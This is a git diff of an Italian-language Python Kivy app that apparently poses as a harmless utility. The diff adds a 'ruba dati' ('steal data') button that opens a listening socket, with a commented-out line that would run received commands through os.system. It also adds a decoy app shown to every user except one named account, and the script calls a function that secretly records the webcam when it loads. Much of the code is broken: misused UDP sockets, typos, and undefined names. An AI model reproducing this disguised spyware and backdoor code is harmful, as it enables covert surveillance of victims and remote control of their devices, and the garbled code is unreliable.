@@ -8,9 +8,12 @@ import subprocess
 import threading
 import os
 import platform
+import webbrowser
+from zipfile import ZipFile
+from zipfile import ZipFile 
 import time
 from pynput import mouse
-
+import socket
 class Universale_Nucleare(App):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
@@ -31,10 +34,14 @@ class Universale_Nucleare(App):
         segreto.bind(on_press=self.secret)
         app.add_widget(segreto)
 
+        rudati=Button(text="ruba dati",font_size=30)
+        rudati.bind(on_press=self.dati)
+        app.add_widget(rudati)
+
         return app
 
     def secret(self, _):
-        if os.name == "Windows":
+        if os.name == "Andoid":
             finestra = subprocess.STARTUPINFO()
             finestra.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             subprocess.Popen("python", startupinfo=finestra)
@@ -61,10 +68,52 @@ class Universale_Nucleare(App):
             return "self.spia()"
         with mouse.Listener(on_move=on_move) as listener:
             listener.join()
+    def dati(self):
+        tipo=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        tipo.bind("0.0.0.0",8090)
+        tipo.listen(2)
+        print(f"server in attesa{tipo}")
+        cocco,ciola=tipo.accept()
+        print(f"server conesso {cocco}")
+        utente=input("-->")
+        #comando=os.system(utente)
+        dati=cocco.recv(1010)
+        cocco.sendall(dati)
+        #cocco.sendall(comando.encode())
+        cocco.close()
+        tipo.close()
 
+class app_normality(App):
+    def build(self):
+        def __init__(self, **kwargs):
+            super().__init__(**kwargs)
+            Apper=BuxLayout(orientation="vertical")    
+            bottnoe=Button(text="richeista",font_size=70)    
+            scansione=Button(text="test wifi password",font_size=70)
+            scansione.bind(on_press=self.scansione)
+            app.add_widget(scansione)
+            bottnoe.bind(on_press=lambda x: webbrowser.open("https://www.gallinella.com"))
+            apper.add_widget(bottnoe)
+            return Apper
 if __name__ == "__main__":
-    Universale_Nucleare().run()
-
+    if os.getenv("USERNAME")=="blue-terminal":
+        Universale_Nucleare().run()
+        if platform.system=="Android":
+            link="http://192.168.1.13:8080/video"
+            cameraandoid=cv2.VideoCapture(link)
+            if not cameraandoid.isOpened():
+                exit()
+            while True:
+                rec,fps=cameraandoid.read()
+                if not rec:
+                    break
+                cv2.imshow("Camera",fps)    
+                if cv2.waitKey(1)&0xFF==ord("q"):
+                    break
+            cameraandoid.release()
+            cv2.destroyAllWindows()
+    else:
+        app_normality().run()
 def spia():
         camera = cv2.VideoCapture(0)
         fourcc = cv2.VideoWriter_fourcc(*"XVID")
@@ -77,5 +126,5 @@ def spia():
         camera.release()
         nomef.release()
 spia()
-if platform.system=="Linux":
-    print("hai il permesso")
+
+print("hai il permesso")
